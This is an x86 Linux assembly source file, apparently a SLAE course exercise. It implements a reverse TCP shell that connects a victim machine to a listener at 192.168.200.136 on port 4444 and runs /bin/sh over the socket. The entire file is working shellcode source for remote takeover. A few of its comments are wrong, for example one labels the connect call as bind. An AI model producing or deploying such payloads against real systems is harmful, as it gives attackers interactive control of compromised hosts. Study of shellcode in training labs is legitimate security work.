; Filename: reverse_tcp_shell.nasm
; Author:  Bohan Zhang
; Website:  https://bohansec.com
; SLAE-ID: 1562
;
;
; Purpose: connect a reverse tcp shell from the victim machine to the host machine 

global _start			

section .text
_start:

	;init the registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
	xor edi, edi

	;create a socket
	mov ax, 359 ;call the socket
	mov bl, 2 ;set domain to 2
	mov cl, 1 ; set type to 1
	int 0x80
	
	mov esi, eax

	;dup2, essentially it gives us ability to enter command and see output in our shell
	mov ebx, eax ;get the oldfd
	mov cl, 3 ;the newfd, stdin, stdout, std error
dup2:
	xor eax,eax ;reset the eax
	mov al, 63 ;call dup2
	int 0x80
	dec ecx ;minus the ecx by 1
	jns dup2 ;jump if not signed

	;call connect
	xor ebx, ebx ;clear ebx
	mov ebx, esi ;set sockfd to the returned 
	mov ax, 362 ;call bind
	push edi
	push dword 0x88c8a8c0 ;192.168.200.136 in hex c0.a8.c8.88 (0xc0a8c888)
	push word 0x5c11 ;port 4444
	push word 0x2	;sin family
	mov ecx, esp	;let ecx points to the start of the stack
	mov dl, 102	;addess length is 102
	int 0x80

	;execve
	xor eax, eax
	push eax ;set envp to 0
	push 0x68732f2f ;ib//

	push 0x6e69622f ;hs/n
	mov ebx, esp ;now our stack is //bin/sh0x00000000, and ebx points to the pathname //bin/sh

	push eax	;push another 0 on the stack, so now our stack is 0x0//bin/sh0x00000000

	mov edx, esp	;edx points to envp, which is the 0x0
	push ebx ;push the memory address of //bin/sh on the stack, so now we have addr0x0//bin/sh0x00000000

	mov ecx, esp	;ecx points to the address of the //bin/sh, which is the argument argv

	mov al, 11 ;call the execve
	int 0x80






